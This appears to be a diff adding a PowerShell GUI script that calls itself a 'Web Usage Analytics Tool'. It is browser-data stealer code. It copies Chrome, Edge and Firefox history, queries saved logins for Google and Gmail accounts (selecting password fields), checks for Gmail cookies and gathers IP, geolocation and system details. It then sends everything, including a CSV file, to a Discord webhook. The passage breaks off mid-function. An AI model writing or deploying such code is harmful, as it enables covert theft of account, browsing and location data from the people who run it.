@@ -1,0 +1,471 @@
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "Web Usage Analytics Tool"
+$form.Size = New-Object System.Drawing.Size(400, 300)
+$form.StartPosition = "CenterScreen"
+$form.FormBorderStyle = "FixedDialog"
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
+$statusLabel = New-Object System.Windows.Forms.Label
+$statusLabel.Location = New-Object System.Drawing.Point(10, 20)
+$statusLabel.Size = New-Object System.Drawing.Size(360, 20)
+$statusLabel.Text = "Ready to start collection..."
+$form.Controls.Add($statusLabel)
+$progressBar = New-Object System.Windows.Forms.ProgressBar
+$progressBar.Location = New-Object System.Drawing.Point(10, 50)
+$progressBar.Size = New-Object System.Drawing.Size(360, 20)
+$progressBar.Style = "Continuous"
+$form.Controls.Add($progressBar)
+$resultsBox = New-Object System.Windows.Forms.TextBox
+$resultsBox.Location = New-Object System.Drawing.Point(10, 80)
+$resultsBox.Size = New-Object System.Drawing.Size(360, 120)
+$resultsBox.Multiline = $true
+$resultsBox.ScrollBars = "Vertical"
+$resultsBox.ReadOnly = $true
+$form.Controls.Add($resultsBox)
+$startButton = New-Object System.Windows.Forms.Button
+$startButton.Location = New-Object System.Drawing.Point(50, 220)
+$startButton.Size = New-Object System.Drawing.Size(100, 30)
+$startButton.Text = "Start"
+$startButton.BackColor = [System.Drawing.Color]::LightGreen
+$form.Controls.Add($startButton)
+$cancelButton = New-Object System.Windows.Forms.Button
+$cancelButton.Location = New-Object System.Drawing.Point(240, 220)
+$cancelButton.Size = New-Object System.Drawing.Size(100, 30)
+$cancelButton.Text = "Cancel"
+$cancelButton.BackColor = [System.Drawing.Color]::LightCoral
+$form.Controls.Add($cancelButton)
+$script:isRunning = $false
+$script:cancellationToken = $false
+function Update-UI {
+    param(
+        [string]$status,
+        [int]$progress = 0,
+        [string]$results = "",
+        [bool]$enableButtons = $true
+    )
+    $form.Invoke([Action]{
+        $statusLabel.Text = $status
+        $progressBar.Value = [Math]::Min([Math]::Max($progress, 0), 100)
+        if ($results) {
+            $resultsBox.AppendText("$results`r`n")
+        }
+        $startButton.Enabled = $enableButtons
+        $cancelButton.Enabled = $enableButtons
+    })
+}
+function Get-SystemInfo {
+    $osInfo = Get-CimInstance Win32_OperatingSystem
+    return @{
+        Platform = "Windows"
+        Architecture = $env:PROCESSOR_ARCHITECTURE
+        Version = $osInfo.Version
+        ComputerName = $env:COMPUTERNAME
+    }
+}
+function Get-NetworkInfo {
+    Update-UI -status "Collecting network information..." -progress 85
+    $networkInfo = @()
+    try {
+        $ipConfig = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq "IPv4" -and $_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "::1"}
+        foreach ($ip in $ipConfig) {
+            $locationInfo = Get-GeoLocation $ip.IPAddress
+            $networkInfo += [PSCustomObject]@{
+                IPAddress = $ip.IPAddress
+                InterfaceAlias = $ip.InterfaceAlias
+                AddressState = $ip.AddressState
+                PrefixLength = $ip.PrefixLength
+                GeoLocation = $locationInfo.City
+                Country = $locationInfo.Country
+                Latitude = $locationInfo.Latitude
+                Longitude = $locationInfo.Longitude
+                ISP = $locationInfo.ISP
+            }
+        }
+    }
+    catch {
+        Update-UI -results "Network info collection error: $($_.Exception.Message)"
+    }
+    return $networkInfo
+}
+function Get-GeoLocation($ipAddress) {
+    try {
+        $response = Invoke-RestMethod -Uri "http://ip-api.com/json/$ipAddress" -TimeoutSec 10
+        return @{
+            City = $response.city
+            Country = $response.country
+            Latitude = $response.lat
+            Longitude = $response.lon
+            ISP = $response.isp
+        }
+    }
+    catch {
+        return @{
+            City = "Unknown"
+            Country = "Unknown"
+            Latitude = 0
+            Longitude = 0
+            ISP = "Unknown"
+        }
+    }
+}
+function Get-BrowserPaths {
+    $paths = @{}
+    $chromePath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default\History"
+    $paths.Chrome = $chromePath
+    $edgePath = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default\History"
+    $paths.Edge = $edgePath
+    $firefoxBase = Join-Path $env:APPDATA "Mozilla\Firefox\Profiles"
+    if (Test-Path $firefoxBase) {
+        $profileDir = Get-ChildItem $firefoxBase | Where-Object { $_.Name -like "*.default*" -or $_.Name -like "*.default-release*" } | Select-Object -First 1
+        if ($profileDir) {
+            $paths.Firefox = Join-Path $profileDir.FullName "places.sqlite"
+        }
+    }
+    return $paths
+}
+function Get-GmailData {
+    Update-UI -status "Checking for Gmail data..." -progress 80
+    $gmailAccounts = @()
+    $browserPaths = Get-BrowserPaths
+    foreach ($browser in $browserPaths.Keys) {
+        $browserDir = Split-Path $browserPaths[$browser] -Parent
+        if (Test-Path $browserDir) {
+            $loginDataPath = Join-Path $browserDir "Login Data"
+            if (Test-Path $loginDataPath) {
+                $tempLoginData = Join-Path $env:TEMP "temp_login_data.db"
+                Copy-Item $loginDataPath $tempLoginData -Force -ErrorAction SilentlyContinue
+                if (Test-Path $tempLoginData) {
+                    $query = "SELECT origin_url, username_value, password_value, date_created FROM logins WHERE origin_url LIKE '%gmail.com%' OR origin_url LIKE '%google.com%' ORDER BY times_used DESC"
+                    $dataTable = Invoke-SqliteQuery $tempLoginData $query
+                    if ($dataTable) {
+                        foreach ($row in $dataTable.Rows) {
+                            $dateCreated = [DateTime]::MinValue
+                            if ($row.date_created -and $row.date_created -gt 0) {
+                                $dateCreated = Convert-ChromeTimestamp $row.date_created
+                            }
+                            $gmailAccounts += [PSCustomObject]@{
+                                Number = $gmailAccounts.Count + 1
+                                Email = $row.username_value
+                                LoginDate = $dateCreated.ToString("yyyy-MM-dd HH:mm:ss")
+                                Browser = $browser
+                            }
+                        }
+                    }
+                    Remove-Item $tempLoginData -ErrorAction SilentlyContinue
+                }
+            }
+            $cookiePath = Join-Path $browserDir "Cookies"
+            if (Test-Path $cookiePath) {
+                $gmailCookies = Get-ChildItem $cookiePath -Recurse -Name "*gmail*" -ErrorAction SilentlyContinue
+                if ($gmailCookies) {
+                    $gmailAccounts += [PSCustomObject]@{
+                        Number = $gmailAccounts.Count + 1
+                        Email = "Found Gmail-related cookies"
+                        LoginDate = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+                        Browser = $browser
+                    }
+                }
+            }
+        }
+    }
+    return $gmailAccounts
+}
+function Copy-DatabaseSafely($sourcePath, $destinationPath) {
+    try {
+        Copy-Item $sourcePath $destinationPath -Force
+        return $true
+    }
+    catch {
+        Update-UI -results "Failed to copy database: $($_.Exception.Message)"
+        return $false
+    }
+}
+function Invoke-SqliteQuery($dbPath, $query) {
+    Add-Type -Path "System.Data.SQLite.dll" -ErrorAction SilentlyContinue -WarningAction SilentlyContinue
+    $connectionString = "Data Source=$dbPath;Version=3;Read Only=True;"
+    $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
+    try {
+        $connection.Open()
+        $command = New-Object System.Data.SQLite.SQLiteCommand($query, $connection)
+        $adapter = New-Object System.Data.SQLite.SQLiteDataAdapter($command)
+        $dataset = New-Object System.Data.DataSet
+        [void]$adapter.Fill($dataset)
+        return $dataset.Tables[0]
+    }
+    catch {
+        Update-UI -results "SQLite Error: $($_.Exception.Message)"
+        return $null
+    }
+    finally {
+        if ($connection.State -eq "Open") {
+            $connection.Close()
+        }
+    }
+}
+function Convert-ChromeTimestamp($microseconds) {
+    try {
+        $epoch = [DateTime]"1601-01-01 00:00:00"
+        $unixEpoch = [DateTime]"1970-01-01 00:00:00"
+        $chromeEpochSeconds = ($epoch.ToUniversalTime() - $unixEpoch).TotalSeconds
+        $unixTimestamp = $chromeEpochSeconds + ($microseconds / 1000000)
+        return [DateTimeOffset]::FromUnixTimeSeconds([int]$unixTimestamp).DateTime
+    }
+    catch {
+        return [DateTime]::MinValue
+    }
+}
+function Convert-FirefoxTimestamp($microseconds) {
+    try {
+        return [DateTimeOffset]::FromUnixTimeSeconds([int]($microseconds / 1000000)).DateTime
+    }
+    catch {
+        return [DateTime]::MinValue
+    }
+}
+function Get-ChromeEdgeHistory($dbPath, $browserName) {
+    $tempDb = Join-Path $env:TEMP "temp_$($browserName.ToLower())_history.db"
+    if (-not (Copy-DatabaseSafely $dbPath $tempDb)) {
+        return @()
+    }
+    $query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500"
+    $results = @()
+    try {
+        $dataTable = Invoke-SqliteQuery $tempDb $query
+        if ($dataTable) {
+            foreach ($row in $dataTable.Rows) {
+                $results += [PSCustomObject]@{
+                    Browser = $browserName
+                    Url = $row.url
+                    Title = $row.title
+                    VisitCount = $row.visit_count
+                    Timestamp = Convert-ChromeTimestamp $row.last_visit_time
+                }
+            }
+        }
+    }
+    catch {
+        Update-UI -results "Error querying $($browserName) database: $($_.Exception.Message)"
+    }
+    finally {
+        Remove-Item $tempDb -ErrorAction SilentlyContinue
+    }
+    return $results
+}
+function Get-FirefoxHistory($dbPath) {
+    $tempDb = Join-Path $env:TEMP "temp_firefox_history.db"
+    if (-not (Copy-DatabaseSafely $dbPath $tempDb)) {
+        return @()
+    }
+    $query = "SELECT moz_places.url, moz_places.title, moz_places.visit_count, moz_places.last_visit_date FROM moz_places WHERE moz_places.visit_count > 0 ORDER BY moz_places.last_visit_date DESC LIMIT 500"
+    $results = @()
+    try {
+        $dataTable = Invoke-SqliteQuery $tempDb $query
+        if ($dataTable) {
+            foreach ($row in $dataTable.Rows) {
+                $results += [PSCustomObject]@{
+                    Browser = "Firefox"
+                    Url = $row.url
+                    Title = $row.title
+                    VisitCount = $row.visit_count
+                    Timestamp = Convert-FirefoxTimestamp $row.last_visit_date
+                }
+            }
+        }
+    }
+    catch {
+        Update-UI -results "Error querying Firefox database: $($_.Exception.Message)"
+    }
+    finally {
+        Remove-Item $tempDb -ErrorAction SilentlyContinue
+    }
+    return $results
+}
+function Export-ToCsv($data, $filePath) {
+    $data | Export-Csv -Path $filePath -NoTypeInformation -Encoding UTF8
+    Update-UI -results "Exported $($data.Count) records to $filePath"
+}
+function Send-DiscordWebhook($webhookUrl, $embeds) {
+    $payload = @{
+        username = "Web Usage Analytics Bot"
+        avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png"
+        embeds = $embeds
+    } | ConvertTo-Json -Depth 10
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+        Update-UI -results "Successfully sent data to Discord webhook"
+    }
+    catch {
+        Update-UI -results "Failed to send to Discord: $($_.Exception.Message)"
+    }
+}
+function Send-FileToDiscord {
+    param(
+        [string]$webhookUrl,
+        [string]$filePath
+    )
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $body = [System.IO.MemoryStream]::new()
+    $writer = [System.IO.StreamWriter]::new($body)
+    $writer.WriteLine("--$boundary")
+    $writer.WriteLine("Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"")
+    $writer.WriteLine("Content-Type: application/octet-stream")
+    $writer.WriteLine()
+    $writer.Flush()
+    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+    $body.Write($fileBytes, 0, $fileBytes.Length)
+    $writer.WriteLine()
+    $writer.WriteLine("--$boundary--")
+    $writer.Flush()
+    try {
+        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body.ToArray() -ContentType "multipart/form-data; boundary=$boundary"
+        Update-UI -results "Successfully sent CSV file to Discord webhook"
+    }
+    catch {
+        Update-UI -results "Failed to send CSV file to Discord: $($_.Exception.Message)"
+    }
+    finally {
+        $body.Dispose()
+        $writer.Dispose()
+    }
+}
+function New-DiscordEmbeds($historyData, $gmailData, $networkInfo) {
+    $browsers = $historyData | Group-Object Browser
+    $totalEntries = $historyData.Count
+    $totalVisits = ($historyData | Measure-Object -Property VisitCount -Sum).Sum
+    $gmailCount = $gmailData.Count
+    $networkCount = $networkInfo.Count
+    $summaryEmbed = @{
+        title = "📊 Web Usage Analytics Report"
+        color = 3066993
+        timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+        fields = @(
+            @{ name = "Total Entries"; value = $totalEntries.ToString(); inline = $true },
+            @{ name = "Total Visits"; value = $totalVisits.ToString(); inline = $true },
+            @{ name = "Gmail Accounts Found"; value = $gmailCount.ToString(); inline = $true },
+            @{ name = "Network Interfaces"; value = $networkCount.ToString(); inline = $true },
+            @{ name = "Generation Time"; value = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss"); inline = $false }
+        )
+    }
+    $browserInfo = ""
+    foreach ($browserGroup in $browsers) {
+        $browserInfo += "**$($browserGroup.Name)**: $($browserGroup.Count) entries`n"
+    }
+    $browsersEmbed = @{
+        title = "🌐 Browsers Found"
+        description = $browserInfo
+        color = 3447003
+    }
+    if ($gmailData.Count -gt 0) {
+        $gmailInfo = "| Num | Gmail | Login Date | Browser |`n|-----|-------|----------|---------|`n"
+        foreach ($item in $gmailData) {
+            $gmailInfo += "| $($item.Number) | $($item.Email) | $($item.LoginDate) | $($item.Browser) |`n"
+        }
+        $gmailEmbed = @{
+            title = "📧 Gmail Accounts Found"
+            description = "```````n$gmailInfo```````"
+            color = 16753920
+        }
+    }
+    if ($networkInfo.Count -gt 0) {
+        $networkTable = "| IP Address | Interface | State | City | Country | ISP |`n|------------|-----------|-------|------|---------|-----|`n"
+        foreach ($net in $networkInfo) {
+            $networkTable += "| $($net.IPAddress) | $($net.InterfaceAlias) | $($net.AddressState) | $($net.GeoLocation) | $($net.Country) | $($net.ISP) |`n"
+        }
+        $networkEmbed = @{
+            title = "🌐 Network Information"
+            description = "```````n$networkTable```````"
+            color = 3381759
+        }
+    }
+    $topSites = $historyData | Sort-Object VisitCount -Descending | Select-Object -First 10
+    $topSitesText = ""
+    for ($i = 0; $i -lt $topSites.Count; $i++) {
+        $site = $topSites[$i]
+        $topSitesText += "**$($i + 1).** [$($site.Title)]($($site.Url)) - $($site.VisitCount) visits`n"
+    }
+    $topSitesEmbed = @{
+        title = "🏆 Top 10 Most Visited Sites"
+        description = $topSitesText
+        color = 15844367
+    }
+    $embedArray = @($summaryEmbed, $browsersEmbed, $topSitesEmbed)
+    if ($gmailData.Count -gt 0) { $embedArray += $gmailEmbed }
+    if ($networkInfo.Count -gt 0) { $embedArray += $networkEmbed }
+    return $embedArray
+}
+function Start-Collection {
+    $script:isRunning = $true
+    $script:cancellationToken = $false
+    Update-UI -status "Starting web usage collection..." -progress 0 -enableButtons $false
+    try {
+        $browserPaths = Get-BrowserPaths
+        Update-UI -results "Looking for browser databases..."
+        $allHistory = @()
+        $gmailData = @()
+        $networkInfo = @()
+        if ($script:cancellationToken) { return }
+        if (Test-Path $browserPaths.Chrome) {
+            Update-UI -status "Processing Chrome history..." -progress 20
+            $chromeHistory = Get-ChromeEdgeHistory $browserPaths.Chrome "Chrome"
+            $allHistory += $chromeHistory
+            Update-UI -results "Chrome: Collected $($chromeHistory.Count) entries"
+        }
+        if ($script:cancellationToken) { return }
+        if (Test-Path $browserPaths.Edge) {
+            Update-UI -status "Processing Edge history..." -progress 40
+            $edgeHistory = Get-ChromeEdgeHistory $browserPaths.Edge "Edge"
+            $allHistory += $edgeHistory
+            Update-UI -results "Edge: Collected $($edgeHistory.Count) entries"
+        }
+        if ($script:cancellationToken) { return }
+        if ($browserPaths.Firefox -and (Test-Path $browserPaths.Firefox)) {
+            Update-UI -status "Processing Firefox history..." -progress 60
+            $firefoxHistory = Get-FirefoxHistory $browserPaths.Firefox
+            $allHistory += $firefoxHistory
+            Update-UI -results "Firefox: Collected $($firefoxHistory.Count) entries"
+        }
+        if ($script:cancellationToken) { return }
+        Update-UI -status "Checking for Gmail data..." -progress 75
+        $gmailData = Get-GmailData
+        Update-UI -results "Gmail: Found $($gmailData.Count) accounts/references"
+        if ($script:cancellationToken) { return }
+        Update-UI -status "Collecting network information..." -progress 85
+        $networkInfo = Get-NetworkInfo
+        Update-UI -results "Network: Found $($networkInfo.Count) interfaces"
+        if ($allHistory.Count -gt 0 -or $gmailData.Count -gt 0 -or $networkInfo.Count -gt 0) {
+            $outputPath = "$env:TEMP\web_usage_analytics"
+            New-Item -ItemType Directory -Path $outputPath -Force
+            $csvPath = Join-Path $outputPath "web_usage_analytics_$((Get-Date).ToString('yyyyMMdd_HHmmss')).csv"
+            if ($allHistory.Count -gt 0) {
+                Export-ToCsv $allHistory $csvPath
+            }
+            $jsonPath = Join-Path $outputPath "web_usage_analytics_$((Get-Date).ToString('yyyyMMdd_HHmmss')).json"
+            $combinedData = @{
+                History = $allHistory
+                GmailData = $gmailData
+                NetworkInfo = $networkInfo
+                SystemInfo = Get-SystemInfo
+                CollectionTime = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss.fffZ")
+            }
+            $combinedData | ConvertTo-Json -Depth 5 | Out-File $jsonPath -Encoding UTF8
+            Update-UI -results "Exported combined data to $jsonPath"
+            $discordWebhookUrl = ""  # Replace with your Discord webhook URL
+            if ($discordWebhookUrl -and $discordWebhookUrl -ne "") {
+                Update-UI -status "Sending results to Discord..." -progress 95
+                $embeds = New-DiscordEmbeds $allHistory $gmailData $networkInfo
+                Send-DiscordWebhook $discordWebhookUrl $embeds
+                if (Test-Path $csvPath) {
+                    Update-UI -status "Sending CSV file to Discord..." -progress 98
+                    Send-FileToDiscord -webhookUrl $discordWebhookUrl -filePath $csvPath
+                }
+            }
+            Update-UI -status "Collection completed successfully!" -progress 100
+            Update-UI -results "Total entries: $($allHistory.Count)"
+            Update-UI -results "Gmail accounts: $($gmailData.Count)"
+            Update-UI -results "Network interfaces: $($networkInfo.Count)"
+            Update-UI -results "Results saved to: $outputPath"
+        }
+        else {
+      
